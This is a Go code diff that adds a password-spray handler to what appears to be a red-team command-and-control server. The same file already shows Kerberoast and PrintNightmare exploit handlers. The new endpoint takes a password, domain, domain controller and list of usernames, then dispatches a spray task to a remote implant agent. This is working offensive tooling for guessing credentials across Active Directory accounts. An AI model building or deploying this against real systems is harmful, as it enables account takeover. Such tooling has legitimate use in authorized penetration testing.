@@ -965,6 +965,55 @@ func (s *Server) handleKerberoast(c *gin.Context) {
 	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"kerberoast", "kerberoast", "Kerberoast requested"})
 }
 
+func (s *Server) handlePasswordSpray(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
+	id := c.Param("id")
+	password := c.PostForm("password")
+	domain := c.PostForm("domain")
+	dc := c.PostForm("dc")
+	delayMs := c.PostForm("delay_ms")
+	usernames := c.PostForm("usernames")
+
+	if password == "" {
+		respondError(c, http.StatusBadRequest, "password is required")
+		return
+	}
+	if domain == "" {
+		respondError(c, http.StatusBadRequest, "domain is required")
+		return
+	}
+	if usernames == "" {
+		respondError(c, http.StatusBadRequest, "usernames list is required")
+		return
+	}
+
+	if _, ok := s.getAgentOrFail(c, id); !ok {
+		return
+	}
+
+	cmd := password + "|" + domain + "|" + dc + "|" + delayMs
+	task, err := s.createTask(id, "password_spray", cmd, "", "", usernames, 0, 0)
+	if err != nil {
+		respondError(c, http.StatusInternalServerError, "failed to create task")
+		return
+	}
+
+	userLines := strings.Split(usernames, "\n")
+	userCount := 0
+	for _, u := range userLines {
+		if strings.TrimSpace(u) != "" {
+			userCount++
+		}
+	}
+
+	detail := fmt.Sprintf("Password spray: domain=%s users=%d delay=%sms", domain, userCount, delayMs)
+	slog.Info("Password spray requested", "agent_id", id, "domain", domain, "users", userCount)
+	s.LogAuditRecord(c, "password_spray", "agent", id, detail, true, nil)
+	s.dispatchTask(c, task, "password_spray", detail)
+}
+
 // 鈹€鈹€ elevate_printnightmare: PrintNightmare exploit 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 func (s *Server) handleElevatePrintNightmare(c *gin.Context) {
 	if !s.requireOperator(c) {
